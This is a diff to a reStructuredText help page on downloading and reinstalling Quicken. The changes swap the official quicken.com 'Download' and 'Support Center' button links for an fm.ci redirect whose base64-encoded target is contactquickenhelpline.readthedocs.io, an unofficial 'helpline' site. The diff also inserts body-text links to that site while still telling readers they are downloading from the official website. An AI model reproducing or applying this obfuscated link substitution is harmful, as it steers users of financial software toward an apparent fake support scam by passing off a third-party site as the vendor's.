@@ -4,17 +4,17 @@ How Do I Download Quicken from Quicken.com to Install or Reinstall It?
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.quicken.com/download" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken Now
         </a>
     </div>
 
-Whether you're setting up Quicken for the first time, switching to a new device, or reinstalling after a system reset, the process to download Quicken from the official website is simple and user-friendly. This guide walks you through the exact steps to download Quicken, install it on your device, and get started managing your finances quickly.
+Whether you're setting up Quicken for the first time, switching to a new device, or reinstalling after a system reset, the process to  `download Quicken <https://contactquickenhelpline.readthedocs.io/en/latest/>`_  from the official website is simple and user-friendly. This guide walks you through the exact steps to download Quicken, install it on your device, and get started managing your finances quickly.
 
 Why You Might Need to Reinstall or Download Quicken Again
 ----------------------------------------------------------
 
-There are several reasons why you might need a fresh Quicken download:
+There are several reasons why you might need a fresh  `Quicken download <https://contactquickenhelpline.readthedocs.io/en/latest/>`_ :
 
 - You’ve purchased a new laptop or desktop and want to transfer Quicken.
 - Your previous device was reset, formatted, or corrupted.
@@ -64,7 +64,7 @@ Step-by-Step Guide to Download Quicken from Quicken.com
 Important Notes for a Smooth Quicken Download Experience
 --------------------------------------------------------
 
-- **System Requirements**: Ensure your computer meets the [latest Quicken system requirements](https://www.quicken.com/support/quicken-system-requirements).
+- **System Requirements**: Ensure your computer meets the `latest Quicken system requirements <https://www.quicken.com/support/quicken-system-requirements>`_
 - **Subscription Status**: An active subscription is required. Expired subscriptions limit functionality.
 - **Internet Connection**: A stable connection is needed for download and activation.
 
@@ -91,10 +91,10 @@ Whether you’re managing household expenses, tracking investments, or planning 
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.quicken.com/download" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Download Quicken Now
         </a>
-        <a href="https://www.quicken.com/support" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Quicken Support Center
         </a>
         <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
